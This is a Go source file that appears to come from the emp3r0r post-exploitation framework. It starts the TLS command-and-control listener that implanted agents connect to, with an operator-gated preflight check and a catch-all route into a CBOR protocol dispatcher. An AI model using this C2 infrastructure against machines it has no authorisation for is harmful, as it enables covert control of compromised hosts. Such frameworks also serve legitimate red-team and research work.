package server

import (
	"context"
	"crypto/tls"
	"fmt"
	"net/http"
	"net/url"
	"os"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/preflight"
	"github.com/posener/h2conn"
)

// StartC2AgentTLSServer starts the agent-facing TLS listener.
//
// The HTTP/2 layer (h2conn) acts as a byte-pipe transport only.
// A single catch-all route accepts every incoming connection and immediately
// delegates to the pure-CBOR protocol dispatcher. No HTTP concepts (URL paths,
// headers, methods, status codes) carry any C2 semantics.
func StartC2AgentTLSServer() {
	if _, err := os.Stat(live.Temp + transport.WWW); os.IsNotExist(err) {
		if err = os.MkdirAll(live.Temp+transport.WWW, 0o700); err != nil {
			logging.Fatalf("StartC2AgentTLSServer: %v", err)
		}
	}

	mux := http.NewServeMux()
	transport.SetCACrtPEM([]byte(live.RuntimeConfig.CAPEM))

	// ── Preflight (UI-level, not C2-protocol) ────────────────────────────────
	if live.RuntimeConfig.PreflightEnabled && live.RuntimeConfig.PreflightURL != "" {
		u, err := url.Parse(live.RuntimeConfig.PreflightURL)
		if err == nil {
			logging.Infof("Registering Preflight handler at %s", u.Path)
			mux.HandleFunc(u.Path, func(w http.ResponseWriter, req *http.Request) {
				if req.Method != live.RuntimeConfig.PreflightMethod {
					http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
					return
				}
				body := make([]byte, 0)
				if req.Body != nil {
					var err error
					body, err = func() ([]byte, error) {
						buf := make([]byte, 4096)
						n, err := req.Body.Read(buf)
						return buf[:n], err
					}()
					if err != nil && err.Error() != "EOF" {
						http.Error(w, "Read error", http.StatusBadRequest)
						return
					}
				}
				hasOperators := false
				OPERATORS.Range(func(key, value any) bool {
					hasOperators = true
					return false
				})
				respData, err := preflight.ProcessRequest(body, hasOperators)
				if err != nil {
					logging.Warningf("Preflight failed: %v", err)
					http.Error(w, "Preflight failed", http.StatusForbidden)
					return
				}
				if hasOperators {
					logging.Infof("Preflight: Allowed connection (Operators active)")
				} else {
					logging.Warningf("Preflight: Rejected connection (No operators)")
				}
				w.WriteHeader(http.StatusOK)
				w.Write(respData)
			})
		}
	}

	// ── Single catch-all: accept h2conn, pass byte-stream to CBOR protocol ───
	// The HTTP layer is a dumb transport wrapper here. All routing and auth
	// decisions are made inside cborProtocolDispatch from the CBOR payload.
	mux.HandleFunc("/", func(w http.ResponseWriter, req *http.Request) {
		conn, err := h2conn.Accept(w, req)
		if err != nil {
			logging.Errorf("cborStreamAccept: h2conn accept failed from %s: %v", req.RemoteAddr, err)
			http.Error(w, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
			return
		}
		t := transport.NewH2Transport(conn, req.RemoteAddr)
		cborStreamAccept(t)
	})

	if network.EmpTLSServer != nil {
		network.EmpTLSServer.Shutdown(network.EmpTLSServerCtx)
	}
	network.EmpTLSServer = &http.Server{
		Addr:    fmt.Sprintf(":%s", live.RuntimeConfig.CCPort),
		Handler: mux,
		TLSConfig: &tls.Config{
			CurvePreferences: []tls.CurveID{
				tls.CurveP256,
				tls.X25519,
			},
			MinVersion: tls.VersionTLS12,
		},
	}
	network.EmpTLSServerCtx, network.EmpTLSServerCancel = context.WithCancel(context.Background())
	logging.Successf("🚀 Starting C2 agent listener service with TLS at port %s", live.RuntimeConfig.CCPort)
	err := network.EmpTLSServer.ListenAndServeTLS(transport.ServerCrtFile, transport.ServerKeyFile)
	if err != nil {
		if err == http.ErrServerClosed {
			logging.Warningf("C2 TLS service is shutdown")
			return
		}
		logging.Fatalf("Failed to start C2 listener at *:%s: %v", live.RuntimeConfig.CCPort, err)
	}
}
